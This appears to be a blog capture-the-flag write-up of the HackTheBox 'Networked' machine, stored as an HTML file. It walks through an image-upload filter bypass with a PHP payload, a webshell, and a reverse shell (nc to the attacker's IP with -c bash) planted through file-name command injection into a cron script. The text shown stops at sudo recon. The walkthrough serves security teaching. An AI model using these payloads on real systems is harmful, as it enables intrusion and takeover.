@@ -1,0 +1,472 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+    <meta name="description" content="Networked was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration. First thing first, let’s add the box IP to the hosts file: 1[hg8@archbook ~]$ echo &quot;10.10.10.146">
+<meta property="og:type" content="article">
+<meta property="og:title" content="HackTheBox - Networked">
+<meta property="og:url" content="https://hg8.sh/networked/index.html">
+<meta property="og:site_name" content="hg8&#39;s Notes — My notes about infosec world. Pentest&#x2F;Bug Bounty&#x2F;CTF Writeups.">
+<meta property="og:description" content="Networked was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration. First thing first, let’s add the box IP to the hosts file: 1[hg8@archbook ~]$ echo &quot;10.10.10.146">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/82158153-62de5900-9886-11ea-8693-ec973771004c.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67149664-317cbb00-f2ae-11e9-961d-579ad1cdd818.png">
+<meta property="og:image" content="https://user-images.githubusercontent.com/9076747/67150075-50318080-f2b3-11e9-8195-26034691deeb.png">
+<meta property="article:published_time" content="2019-11-15T23:00:00.000Z">
+<meta property="article:modified_time" content="2020-05-18T10:09:12.964Z">
+<meta property="article:author" content="hg8">
+<meta property="article:tag" content="webshell">
+<meta property="article:tag" content="gobuster">
+<meta property="article:tag" content="command-injection">
+<meta property="article:tag" content="networked">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="upload">
+<meta property="article:tag" content="weevely">
+<meta property="article:tag" content="filtering">
+<meta property="article:tag" content="sudo">
+<meta property="article:tag" content="ifcfg">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://user-images.githubusercontent.com/9076747/82158153-62de5900-9886-11ea-8693-ec973771004c.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+     
+    <title>HackTheBox - Networked :: hg8&#39;s Notes — My notes about infosec world. Pentest/Bug Bounty/CTF Writeups.</title>
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+      
+<link rel="stylesheet" href="/css/rtl.css">
+
+    
+    <!-- rss -->
+    
+    
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" href="/wall/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" href="/jarvis/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://hg8.sh/networked/" target="_blank" rel="noopener"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://hg8.sh/networked/&text=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hg8.sh/networked/&is_video=false&description=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=HackTheBox - Networked&body=Check out this article: https://hg8.sh/networked/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://hg8.sh/networked/&title=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://hg8.sh/networked/&name=HackTheBox - Networked&description=" target="_blank" rel="noopener"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://news.ycombinator.com/submitlink?u=https://hg8.sh/networked/&t=HackTheBox - Networked" target="_blank" rel="noopener"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#User-Flag"><span class="toc-number">1.</span> <span class="toc-text">User Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon"><span class="toc-number">1.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#File-upload-vulnerability"><span class="toc-number">1.2.</span> <span class="toc-text">File upload vulnerability</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-First-Check-MIME-Type"><span class="toc-number">1.2.1.</span> <span class="toc-text">Bypass First Check: MIME Type</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Bypass-Second-Check-File-extension"><span class="toc-number">1.2.2.</span> <span class="toc-text">Bypass Second Check: File extension**</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Pivot-PHP-Webshell-gt-guly"><span class="toc-number">1.3.</span> <span class="toc-text">Pivot PHP Webshell -&gt; guly</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Root-Flag"><span class="toc-number">2.</span> <span class="toc-text">Root Flag</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Recon-1"><span class="toc-number">2.1.</span> <span class="toc-text">Recon</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#network-script-privilege-escalation"><span class="toc-number">2.2.</span> <span class="toc-text">network-script privilege escalation</span></a></li></ol></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        <header id="header">
+  <a href="/">
+  
+      <div id="logo" style="background-image: url(/images/logo.png);"></div>
+  
+    <span class="logo__mark"></span>
+    <span class="logo__text">./hg8.sh</span>
+    <span class="logo__cursor"></span>
+  </a>
+  <div id="nav">
+    <ul>
+      <li class="icon">
+        <a href="#"><i class="fas fa-bars fa-2x"></i></a>
+      </li>
+       
+        <li><a href="/">Home</a></li>
+       
+        <li><a href="/about/">About</a></li>
+       
+        <li><a href="/archives/">Posts</a></li>
+       
+        <li><a href="/search/">Search</a></li>
+       
+        <li><a href="/tags/">Tags</a></li>
+      
+    </ul>
+  </div>
+</header>
+
+        
+          <br>
+          <br>
+        
+        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        HackTheBox - Networked
+    </h1>
+
+
+
+    <div class="meta"> 
+      
+    <div class="postdate">
+      
+        <time datetime="2019-11-15T23:00:00.000Z" itemprop="datePublished">16-11-2019</time>
+        
+      
+    </div>
+
+
+      — Written by 
+      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span itemprop="name">hg8</span>
+      </span>
+      —
+      9 min read
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <img width="582" alt="networked-hackthebox" src="https://user-images.githubusercontent.com/9076747/82158153-62de5900-9886-11ea-8693-ec973771004c.png">
+
+<p>Networked was an interesting box. Focused on coding mistakes rather than exploit or misconfiguration.</p>
+<p>First thing first, let’s add the box IP to the hosts file:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"10.10.10.146 networked.htb"</span> &gt;&gt; /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>Let’s go !</p>
+<h2 id="User-Flag"><a href="#User-Flag" class="headerlink" title="User Flag"></a>User Flag</h2><h3 id="Recon"><a href="#Recon" class="headerlink" title="Recon"></a>Recon</h3><p>Let’s start with the classic <code>nmap</code> scan:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nmap -sV -sT -sC networked.htb</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-19 19:47 CEST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> networked.htb (10.10.10.146)</span><br><span class="line">PORT    STATE  SERVICE VERSION</span><br><span class="line">22/tcp  open   ssh     OpenSSH 7.4 (protocol 2.0)</span><br><span class="line">80/tcp  open   http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)</span><br><span class="line">|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16</span><br><span class="line">443/tcp closed https</span><br></pre></td></tr></table></figure>
+
+<p>Seems like we have something super classical: A http (port 80) and SSH (port 22) service open.</p>
+<p>Opening <a href="http://networked.htb" target="_blank" rel="noopener">http://networked.htb</a> display the following message :</p>
+<blockquote>
+<p>Hello mate, we’re building the new FaceMash!<br>Help by funding us and be the new Tyler&amp;Cameron!<br>Join us at the pool party this Sat to get a glimpse</p>
+</blockquote>
+<p>No useful informations in this message. Let’s continue our recon phase with a HTTP enumeration.</p>
+<p>As usual use <code>gobuster</code>. I add the <code>-x php</code> parameter to make sure we get all files with this extension :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ gobuster dir -u http://networked.htb -w ~/SecLists/Discovery/Web-Content/big.txt -x php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.0.1</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@_FireFart_)</span><br><span class="line">===============================================================</span><br><span class="line">/.htaccess (Status: 403)</span><br><span class="line">/.htaccess.php (Status: 403)</span><br><span class="line">/.htpasswd (Status: 403)</span><br><span class="line">/.htpasswd.php (Status: 403)</span><br><span class="line">/backup (Status: 301)</span><br><span class="line">/cgi-bin/ (Status: 403)</span><br><span class="line">/index.php (Status: 200)</span><br><span class="line">/lib.php (Status: 200)</span><br><span class="line">/photos.php (Status: 200)</span><br><span class="line">/upload.php (Status: 200)</span><br><span class="line">/uploads (Status: 301)</span><br></pre></td></tr></table></figure>
+
+<p>The <code>/backup</code> endpoint is promising. Once opening it we find an archive :</p>
+<p><img src="https://user-images.githubusercontent.com/9076747/67149664-317cbb00-f2ae-11e9-961d-579ad1cdd818.png" alt="Networked backup page"></p>
+<p>Let’s download it and check what’s inside:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget http://networked.htb/backup/backup.tar</span><br><span class="line">2019-10-19 19:57:46 (65.6 MB/s) - <span class="string">'backup.tar'</span> saved [10240/10240]</span><br><span class="line">[hg8@archbook ~]$ tar -xvf backup.tar</span><br><span class="line">index.php</span><br><span class="line">lib.php</span><br><span class="line">photos.php</span><br><span class="line">upload.php</span><br></pre></td></tr></table></figure>
+
+<p>It’s a backup of the website. Seems like <code>gobuster</code> did a good job since it already found each of those files.</p>
+<p>Upon investigating the file we find that <code>upload.php</code> is …well… a upload page. It accepts only image and part of the code that check the validity of the sent file is written in <code>lib.php</code> alongside various functions.</p>
+<p><code>photos.php</code> is used to display uploaded images.</p>
+<p>First thing that come to mind here is to try to upload a php webshell through the <code>upload.php</code> page. Let’s check the rules that validate if a file is valid or not :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!(check_file_type($_FILES[<span class="string">"myFile"</span>]) &amp;&amp; filesize($_FILES[<span class="string">'myFile'</span>][<span class="string">'tmp_name'</span>]) &lt; <span class="number">60000</span>)) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Invalid image file.&lt;/pre&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check_file_type</span><span class="params">($file)</span> </span>&#123;</span><br><span class="line">  $mime_type = file_mime_type($file);</span><br><span class="line">  <span class="keyword">if</span> (strpos($mime_type, <span class="string">'image/'</span>) === <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">  &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>The first check consist in a <a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types" target="_blank" rel="noopener">MIME type</a> check of the file. If the file MIME type doesn’t contain <code>image/</code> it will be defined as invalid.</p>
+<p>This check means that the image will be validated locally, so no request edition will help to smuggle a PHP Shell (by editing <code>Content-Type</code> header for example).</p>
+<p>Scrolling through the code we notice a second check :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$validext = <span class="keyword">array</span>(<span class="string">'.jpg'</span>, <span class="string">'.png'</span>, <span class="string">'.gif'</span>, <span class="string">'.jpeg'</span>);</span><br><span class="line">$valid = <span class="keyword">false</span>;</span><br><span class="line"><span class="keyword">foreach</span> ($validext <span class="keyword">as</span> $vext) &#123;</span><br><span class="line">  <span class="keyword">if</span> (substr_compare($myFile[<span class="string">"name"</span>], $vext, -strlen($vext)) === <span class="number">0</span>) &#123;</span><br><span class="line">    $valid = <span class="keyword">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>This one check do compare the end of the filename to see if it end with the common <code>.jpg</code>, <code>.png</code>, <code>.gif</code> and <code>.jpeg</code>. If not, the file is defined invalid and not uploaded.</p>
+<p>Alright, with all those information in mind let’s try to craft one malicious image :)</p>
+<h3 id="File-upload-vulnerability"><a href="#File-upload-vulnerability" class="headerlink" title="File upload vulnerability"></a>File upload vulnerability</h3><h4 id="Bypass-First-Check-MIME-Type"><a href="#Bypass-First-Check-MIME-Type" class="headerlink" title="Bypass First Check: MIME Type"></a>Bypass First Check: MIME Type</h4><p>The easiest way to do so is to take a valid image and append the malicious content at the end of the file. It can be done in various way. Here how I did:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ <span class="comment"># Download most basic jpg image possible</span></span><br><span class="line">[hg8@archbook ~]$ wget https://raw.githubusercontent.com/mathiasbynens/small/master/jpeg.jpg -O hg8.jpeg</span><br><span class="line">[hg8@archbook ~]$ <span class="built_in">echo</span> <span class="string">"&lt;?php phpinfo(); ?&gt;"</span> &gt;&gt; hg8.jpeg</span><br><span class="line">[hg8@archbook ~]$ cat hg82.jpeg</span><br><span class="line">����C</span><br><span class="line">��</span><br><span class="line"> ���?�� ��&lt;?php phpinfo(); ?&gt;</span><br></pre></td></tr></table></figure>
+
+<h4 id="Bypass-Second-Check-File-extension"><a href="#Bypass-Second-Check-File-extension" class="headerlink" title="Bypass Second Check: File extension**"></a>Bypass Second Check: File extension**</h4><p>A common vulnerability in php file upload form is the “double extension” :</p>
+<blockquote>
+<p>In Apache, a php file might be executed using the double extension technique such as “file.php.jpg.<br><a href="https://www.owasp.org/index.php/Unrestricted_File_Upload" target="_blank" rel="noopener">Unrestricted File Upload</a></p>
+</blockquote>
+<p>And that’s exactly what we are going to do. The second check will pass because our file extension will be <code>.jpg</code> but the php code inside will still get executed:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ mv hg8.jpg hg8.php.jpg</span><br></pre></td></tr></table></figure>
+
+<p>We are ready to upload now! Everything seems to went fine since we get the following message : <code>file uploaded, refresh gallery</code>. The gallery is the <code>photos.php</code> endpoint. Opening this page display a list of recently uploaded files and one with the <code>.php.jpg</code> extension get the attention.</p>
+<p>In the <code>upload.php</code> file we got information about the location of stored images :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">define(<span class="string">"UPLOAD_DIR"</span>, <span class="string">"/var/www/html/uploads/"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>We have the location of the upload folder and the name of the file. Let’s open it ! Mine is at <a href="http://networked.htb/uploads/10_10_15_101.php.jpg" target="_blank" rel="noopener">http://networked.htb/uploads/10_10_15_101.php.jpg</a></p>
+<p><img src="https://user-images.githubusercontent.com/9076747/67150075-50318080-f2b3-11e9-8195-26034691deeb.png" alt="Networked upload"></p>
+<h3 id="Pivot-PHP-Webshell-gt-guly"><a href="#Pivot-PHP-Webshell-gt-guly" class="headerlink" title="Pivot PHP Webshell -&gt; guly"></a>Pivot PHP Webshell -&gt; guly</h3><p>Now that we have a working process let’s replace the <code>phpinfo()</code> by a webshell and we can easily land a shell running as <code>apache</code> user :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads $ id</span><br><span class="line">uid=48(apache) gid=48(apache) groups=48(apache)</span><br></pre></td></tr></table></figure>
+
+<p>The first thing I do after landing a webshell is to check the <code>/etc/password</code> file to find the user we will need to pivot to for finding our flag.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads $ cat /etc/passwd</span><br><span class="line">root:x:0:0:root:/root:/bin/bash</span><br><span class="line">[...]</span><br><span class="line">guly:x:1000:1000:guly:/home/guly:/bin/bash</span><br><span class="line">[...]</span><br></pre></td></tr></table></figure>
+
+<p>Beside <code>root</code> the only user to have a shell setup is <code>guly</code>. It’s our new target ;)</p>
+<p>First we will check if <code>guly</code> have any interesting file in his home folder :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ls -l /home/guly</span><br><span class="line">total 16</span><br><span class="line">-r--r--r--. 1 root root 782 Oct 30  2018 check_attack.php</span><br><span class="line">-rw-r--r--  1 root root  44 Oct 30  2018 crontab.guly</span><br><span class="line">-rw-------  1 guly guly 770 Oct 19 18:28 dead.letter</span><br><span class="line">-r--------. 1 guly guly  33 Oct 30  2018 user.txt</span><br></pre></td></tr></table></figure>
+
+<p>The flag is indeed there upon various other files.</p>
+<p>We can see two interresting files in <code>guly</code> home foler. A crontab file and a php script :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat /home/guly/crontab.guly</span><br><span class="line">*/3 * * * * php /home/guly/check_attack.php</span><br></pre></td></tr></table></figure>
+
+<p>The cronjob run the <code>check_attack.php</code> script every 3 minutes.</p>
+<p>We don’t have write access to the script so we are not able to edit it to inject command. Since we have read access let’s investigate to see if we can find a vulnerability in the runtime :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span> <span class="string">'/var/www/html/lib.php'</span>;</span><br><span class="line">$path = <span class="string">'/var/www/html/uploads/'</span>;</span><br><span class="line">$logpath = <span class="string">'/tmp/attack.log'</span>;</span><br><span class="line">$to = <span class="string">'guly'</span>;</span><br><span class="line">$msg= <span class="string">''</span>;</span><br><span class="line">$headers = <span class="string">"X-Mailer: check_attack.php\r\n"</span>;</span><br><span class="line"></span><br><span class="line">$files = <span class="keyword">array</span>();</span><br><span class="line">$files = preg_grep(<span class="string">'/^([^.])/'</span>, scandir($path));</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($files <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">[...]</span><br><span class="line">    exec(<span class="string">"rm -f $logpath"</span>);</span><br><span class="line">    exec(<span class="string">"nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"rm -f $path$value\n"</span>;</span><br><span class="line">    mail($to, $msg, $msg, $headers, <span class="string">"-F$value"</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Three <code>exec</code> calls, we will surely find a way to inject something…</p>
+<p>First exec (<code>exec(&quot;rm -f $logpath&quot;);)</code> can’t do anything since <code>$logpath</code> is harcoded.</p>
+<p>Second exec (<code>exec(&quot;nohup /bin/rm -f $path$value &gt; /dev/null 2&gt;&amp;1 &amp;&quot;);</code> is already more interesting. Reading thought the code we understand that <code>$value</code> is dynamically fetched from the filenames of files present in the <code>/var/www/html/uploads/</code> folder.</p>
+<p>For example with our previously uploaded image file (<code>hg8.php.jpg</code>) the executed command will be :</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"nohup /bin/rm -f /var/www/html/uploads/hg8.php.jpg &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>So if we are a file named, for example, <code>; sleep 5 ;</code> here is what the executed command will be:</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exec(<span class="string">"nohup /bin/rm -f /var/www/html/uploads/; sleep 5 ; &gt; /dev/null 2&gt;&amp;1 &amp;"</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Since we have write access to the <code>/var/www/html/uploads/</code> folder let’s try it out with a reverse shell.</p>
+<p>Firstly let’s open our listener :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br></pre></td></tr></table></figure>
+
+<p>And let’s create our ‘malicious’ file :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">networked.htb:/var/www/html/uploads$ touch <span class="string">"; nc 10.10.10.10 8544 -c bash ;"</span></span><br></pre></td></tr></table></figure>
+
+<p>We wait a little bit for the cronjob to run and surely a new connection open on our listener :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ nc -l -vv -p 8544</span><br><span class="line">Listening on any address 8544</span><br><span class="line">Connection from 10.10.10.146:52024</span><br><span class="line">[guly@networked ~]$ id</span><br><span class="line">uid=1000(guly) gid=1000(guly) groups=1000(guly)</span><br><span class="line">[guly@networked ~]$ cat user.txt</span><br><span class="line">526cxxxxxxxxxxx1c5</span><br></pre></td></tr></table></figure>
+
+<h2 id="Root-Flag"><a href="#Root-Flag" class="headerlink" title="Root Flag"></a>Root Flag</h2><h3 id="Recon-1"><a href="#Recon-1" class="headerlink" title="Recon"></a>Recon</h3><p>To make the recon task easier, we are going to use the <a href="https://github.com/diego-treitos/linux-smart-enumeration" target="_blank" rel="noopener">Linux enumeration tool</a>. For the transfer of the script we will setup a simple http server on our attacking machine:</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[hg8@archbook ~]$ wget <span class="string">"https://github.com/diego-treitos/linux-smart-enumeration/raw/master/lse.sh"</span> -O lse.sh</span><br><span class="line">[hg8@archbook ~]$ python -m http.server</span><br><span class="line">Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</span><br><span class="line"></span><br><span class="line">[guly@networked]$ wget 10.10.10.10:8000/lse.sh -O /tmp/lse.sh</span><br><span class="line">2019-10-17 08:00:49 (527 KB/s) - <span class="string">'/tmp/lse.sh'</span> saved [31736/31736]</span><br></pre></td></tr></table></figure>
+
+<p>Let’s run the script to see if we can find anything intesrresting :</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[guly@networked]$ bash /tmp/lse.sh</span><br><span class="line"></span><br><span class="line">[...]</span><br><span class="line">===================================================================( sudo )=====</span><br><span class="line">[!] sud000 Can we sudo without a password?................................. nope</span><br><span class="line">[!] sud010 Can we list sudo commands without a password?................... yes!</span><br><span class="line">---</span><br><span class="line">User guly may run the following commands on networked:</span><br><span class="line">    (root) NOPASSWD: /usr/<span class="built_in">local</span>/sbin/changename.sh</span><br><span class="line">==================================( FINISHED )==================================</span><br></pre></td></tr></table></figure>
+
+<p>We notice a very interesting configuration here. The script <code>/usr/local/sbin/changename.sh</code> can be run as <code>root</code> without password through sudo. If we can edit or find a flaw in this script it will be our pass to the root flag.</p>
